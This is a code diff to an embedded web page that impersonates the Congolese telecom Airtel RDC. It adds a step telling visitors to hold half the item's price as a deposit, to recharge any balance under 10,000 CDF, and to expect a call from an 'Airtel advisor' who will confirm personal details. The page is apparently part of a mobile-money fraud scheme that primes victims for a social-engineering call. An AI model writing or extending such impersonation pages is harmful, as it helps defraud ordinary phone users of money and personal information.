@@ -581,7 +581,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
           </div>
         );
       }
-      if (step === 3) {
+      if (step === 4) {
         return (
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
@@ -599,6 +599,35 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                   <p className='text-gray-700 font-medium text-lg'>Un conseiller vous contactera au numéro <span className='text-red-600 font-bold'>+243 {phone}</span> sous 24 heures pour finaliser votre dossier.</p>
                 </div>
                 <button onClick={() => window.close()} className='w-full mt-10 py-5 border-2 border-gray-200 text-gray-600 rounded-full text-xl font-bold hover:bg-gray-50 transition-colors'>Fermer cette fenêtre</button>
+              </div>
+            </main>
+          </div>
+        );
+      }
+
+      if (step === 3) {
+        return (
+          <div className='min-h-screen flex flex-col'>
+            <header className='airtel-red text-white p-6 text-center relative'>
+              <h1 className='text-3xl font-bold'>Airtel RDC</h1>
+              <p className='text-sm mt-1 opacity-90'>Étapes suivantes</p>
+            </header>
+            <main className='flex-1 flex justify-center px-4 -mt-6'>
+              <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12'>
+                <h2 className='text-3xl font-bold text-gray-900'>Instructions importantes</h2>
+                <div className='mt-8 space-y-6 text-gray-600 text-lg'>
+                  <p>Pour qualifier à l'obtention de cet article, veuillez noter les conditions suivantes :</p>
+                  <ul className='list-disc pl-5 space-y-3'>
+                    <li>Vous devez avoir au moins la moitié du prix ou le dépôt requis pour continuer.</li>
+                    <li>Si votre solde est inférieur à <b>10 000 CDF</b>, veuillez recharger votre compte avant de procéder.</li>
+                    <li><b>Note :</b> Aucun montant ne sera débité de votre compte avant la réception effective de votre article.</li>
+                  </ul>
+                  <div className='bg-blue-50 border-l-4 border-blue-500 p-4 mt-6'>
+                    <p className='font-bold text-blue-800'>Prochaines étapes :</p>
+                    <p>Un conseiller du service client Airtel vous appellera pour confirmer votre localisation et vos informations personnelles. L'article vous sera ensuite soit livré, soit mis à disposition pour récupération dans notre magasin.</p>
+                  </div>
+                </div>
+                <button onClick={() => setStep(4)} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Procéder à la demande</button>
               </div>
             </main>
           </div>
